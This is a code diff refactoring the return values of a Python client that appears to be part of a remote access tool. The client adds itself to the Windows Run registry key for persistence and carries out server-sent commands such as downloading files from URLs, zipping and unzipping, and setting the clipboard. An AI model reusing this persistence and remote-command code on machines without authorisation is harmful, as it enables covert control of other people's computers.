@@ -108,7 +108,7 @@ def add_startup() -> list:
     """ Add Client to startup """
     # returns [True/False, None/error]
     if platform.system() != 'Windows':
-        return [False, 'Startup feature is only for Windows']
+        return 'Startup feature is only for Windows'
     if getattr(sys, 'frozen', False):
         path = sys.executable
     elif __file__:
@@ -119,16 +119,16 @@ def add_startup() -> list:
         SetValueEx(key, STARTUP_REG_NAME, 0, REG_SZ, path)
         CloseKey(key)
     except Exception as error:
-        return [False, errors(error)]
+        return errors(error)
     logging.info('Added Client to Startup')
-    return [True, None]
+    return None
 
 
 def remove_startup() -> list:
     """ Remove Client from Startup """
     # returns [True/False, None/error]
     if platform.system() != 'Windows':
-        return [False, 'Startup feature is only for Windows.']
+        return 'Startup feature is only for Windows'
     try:
         key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
             0, KEY_ALL_ACCESS)
@@ -139,9 +139,9 @@ def remove_startup() -> list:
         # Still returns True, since it's not in startup
         pass
     except WindowsError as error:
-        return [False, errors(error)]
+        return errors(error)
     logging.info('Removed Client from Startup')
-    return [True, None]
+    return None
 
 
 def kill(pid: int) -> None:
@@ -363,9 +363,9 @@ class Client(object):
                     with ZipFile(data[1], 'w') as ziph:
                         ziph.write(data[2])
                 except Exception as err:
-                    self.send_json([False, errors(err)])
+                    self.send_json(errors(err))
                     continue
-                self.send_json([True, None])
+                self.send_json(None)
                 continue
 
             if data[0] == 'ZIP_DIR':
@@ -373,9 +373,9 @@ class Client(object):
                 try:
                     shutil.make_archive(data[1], 'zip', data[2])
                 except Exception as err:
-                    self.send_json([False, errors(err)])
+                    self.send_json(errors(err))
                     continue
-                self.send_json([True, None])
+                self.send_json(None)
                 continue
 
             if data[0] == 'UNZIP':
@@ -384,9 +384,9 @@ class Client(object):
                     with ZipFile(data[1], 'r') as ziph:
                         ziph.extractall()
                 except Exception as err:
-                    self.send_json([False, errors(err)])
+                    self.send_json(errors(err))
                     continue
-                self.send_json([True, None])
+                self.send_json(None)
                 continue
 
             if data[0] == 'DOWNLOAD':
@@ -396,9 +396,9 @@ class Client(object):
                     with open(data[2], 'wb') as _file:
                         _file.write(request.content)
                 except Exception as err:
-                    self.send_json([False, errors(err, line=False)])
+                    self.send_json(errors(err, line=False))
                     continue
-                self.send_json([True, None])
+                self.send_json(None)
                 continue
 
             if data[0] == 'INFO':
@@ -469,9 +469,9 @@ class Client(object):
                 try:
                     pyperclip.copy(data[1])
                 except pyperclip.PyperclipException as err:
-                    self.send_json([False, errors(err)])
+                    self.send_json(errors(err))
                     continue
-                self.send_json([True, None])
+                self.send_json(None)
                 continue
 
             if data[0] == 'PASTE':
